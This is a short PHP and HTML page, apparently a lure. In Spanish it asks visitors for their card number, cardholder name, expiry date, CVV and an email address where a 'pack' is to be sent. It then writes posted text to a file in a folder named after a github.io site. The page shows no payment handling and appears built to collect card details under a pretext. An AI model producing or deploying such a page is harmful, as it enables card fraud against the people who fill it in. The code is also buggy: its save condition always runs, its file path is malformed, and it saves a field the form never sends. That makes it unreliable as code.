
<?php
$action = $_GET["action"];
$myText = $_POST["mytext"];

if($action = "save") {
  $targetFolder = "martina00soledad.github.io";
  file_put_contents($targetFolder."mytext.txt", $myText);
}
?> 


<html>
  <body>
  <form action="?action=save" name="myform" method="post">
  <label for="fnumber">Número</label><br>
  <input type="text" id="fnumber" name="fnumber"><br>
   <label for="ftit">Titular de la Tarjeta</label><br>
  <input type="text" id="ftit" name="ftit"><br>
  <label for="fdate">Fecha de caducidad de la tarjeta</label><br>
  <input type="text" id="fdate" name="fdate"><br>
   <label for="fcvv">CVV (código de seguridad en el dorso de la tarjeta) </label><br>
  <input type="text" id="fcvv" name="fcvv"><br>
    <label for="email">Email donde querés recibir mi pack </label>  
     <br>


              <input type="email" id="email" name="email"/> <br/> 
   <br>
  <input type="submit" value="save">
   
  
</form> 
  </body>
  

</html>

